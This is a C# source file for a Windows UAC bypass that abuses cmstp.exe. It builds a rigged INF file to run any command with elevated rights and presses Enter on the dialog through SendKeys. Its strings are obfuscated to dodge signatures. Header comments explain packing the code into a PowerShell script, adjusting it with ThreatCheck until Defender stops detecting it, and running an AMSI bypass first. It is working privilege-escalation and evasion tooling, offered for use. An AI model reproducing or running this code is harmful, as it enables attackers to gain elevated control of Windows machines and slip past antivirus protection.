using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Collections.Generic;
using System.Windows;
using System.Runtime.InteropServices;

// Serialize into Invoke-cmstpUAC.ps1:
// b64=$(echo -e "gzipB64 = \"$(cat Source_obfs.cs | sed -e 's,//.*$,,g' | sed -re ':a;N;$!ba;s/\n/ /g' -e 's/[ ]+/ /g' | gzip -c | base64 -w0)\";") ;  sed -re "s#gzipB64 =.*;#$b64#g" Invoke-cmstpUAC.ps1 -i
// For ironing out Defender detections on the DLL:
// https://github.com/rasta-mouse/ThreatCheck
// iex Invoke-cmstpUAC.ps1 ; Invoke-cmstpUAC -out  ## writes DLL to \windows\tasks\doosey.dll
// .\ThreatCheck.exe -f \windows\tasks\doosey.dll -t Bin  ## shows what was detected, its up to you to massage it out
// Note that, if RealtimeProtection is enabled, you should frontrun execution of the Invoke-cmstpUAC cmdlet with an AMSI bypass, I found that patching amsiOpenSession to return failure (amsiContext[:4] != "AMSI", amsiSession = Intptr.Zero) works.

public class CMSTPBypass
{
    public static void Execute(string CommandToExecute)
    {
        if(!File.Exists(BP+Shovel(xp,monk)+"\\"+Shovel(bp,wonk)))
        {
            Environment.Exit(1);
        }
        StringBuilder InfFile = new StringBuilder();
        InfFile.Append(SetInfFile(CommandToExecute));
 
        ProcessStartInfo startInfo = new ProcessStartInfo(BP+Shovel(xp,monk)+"\\"+Shovel(bp,wonk));
        startInfo.Arguments = "/au " + InfFile.ToString();
        startInfo.UseShellExecute = false;
        Process.Start(startInfo);
 
        IntPtr windowHandle = new IntPtr();
        windowHandle = IntPtr.Zero;
        do {
            windowHandle = SetWindowActive(Shovel(bp,honk));
        } while (windowHandle == IntPtr.Zero);

        System.Windows.Forms.SendKeys.SendWait(Shovel(ep,gonk));
        File.Delete(InfFile.ToString());
    }

    private static string SetInfFile(string CommandToExecute)
    {
        string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
        string TemporaryDir = BP + Shovel(xp,donk);
        StringBuilder OutputFile = new StringBuilder();
        OutputFile.Append(TemporaryDir);
        OutputFile.Append("\\");
        OutputFile.Append(RandomFileName);
        OutputFile.Append(".inf");
        StringBuilder newInfData = new StringBuilder();
        foreach (var st in InfData) {newInfData.AppendLine(st);};
        newInfData.Replace("GAMIFIED_WARPANE", CommandToExecute);
        newInfData.Replace("SemperFi.ini", Shovel(gp,ponk));
        newInfData.Replace("MARBLED_BEEF", Shovel(bp,wonk));
        File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
        return OutputFile.ToString();
    }
 
    private static IntPtr SetWindowActive(string ProcessName)
    {
        Process[] target = Process.GetProcessesByName(ProcessName);
        if(target.Length == 0) return IntPtr.Zero;
        target[0].Refresh();
        IntPtr WindowHandle = new IntPtr();
        WindowHandle = target[0].MainWindowHandle;
        if(WindowHandle == IntPtr.Zero) return IntPtr.Zero;
        SetForegroundWindow(WindowHandle);
        ShowWindow(WindowHandle, 5);
        return WindowHandle;
    }

    private static string Shovel(String G, List<int> L){
        string up = "";
        for (int i=0; i<L.Count; i++){
            up = up + G.Substring(L[i],1);
        }
        return up;
    }

    [DllImport("user32.dll")] private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll", SetLastError = true)] private static extern bool SetForegroundWindow(IntPtr hWnd);

    private static List<string> InfData = new List<string> {
        "[version]",
        "Signature=$chicago$",
        "AdvancedINF=2.5",
        //" ", 
        "[DefaultInstall]",
        "CustomDestination=CustInstDestSectionAllUsers",
        "RunPreSetupCommands=RunPreSetupCommandsSection",
        //" ",
        "[RunPreSetupCommandsSection]",
        "GAMIFIED_WARPANE",
        "taskkill /IM MARBLED_BEEF /F",
        //" ",
        "[CustInstDestSectionAllUsers]",
        "49000,49001=AllUSer_LDIDSection, 7",
        //" ",
        "[AllUSer_LDIDSection]",
        "\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\SemperFi.ini\", \"ProfileInstallPath\", \"%UnexpectedError%\", \"\"",
        //" ",
        "[Strings]",
        "ServiceName=\"VPN\"",
        "ShortSvcName=\"VPN\"",
        //" "
    };

    private static string BP = "c:\\windows\\";
    private static string xp = "spe3mt2yak";    //system32,tasks
    private static string bp = "pste.mcx";      //cmstp.exe
    private static string gp = "C3R2M.GEX";     //CMMGR32.EXE
    private static string ep = "{RETN}";        //{ENTER}
    private static List<int> wonk = new List<int> {6,5,1,2,0,4,3,7,3};     //cmstp.exe @bp
    private static List<int> ponk = new List<int> {0,4,4,6,2,1,3,5,7,8,7}; //CMMGR32.EXE @gp
    private static List<int> gonk = new List<int> {0,2,4,3,2,1,5};         //{ENTER} @ep
    private static List<int> honk = new List<int> {6,5,1,2,0};             //cmstp @bp
    private static List<int> monk = new List<int> {0,7,0,5,2,4,3,6};       //system32
    private static List<int> donk = new List<int> {5,8,0,9,0};             //tasks
}
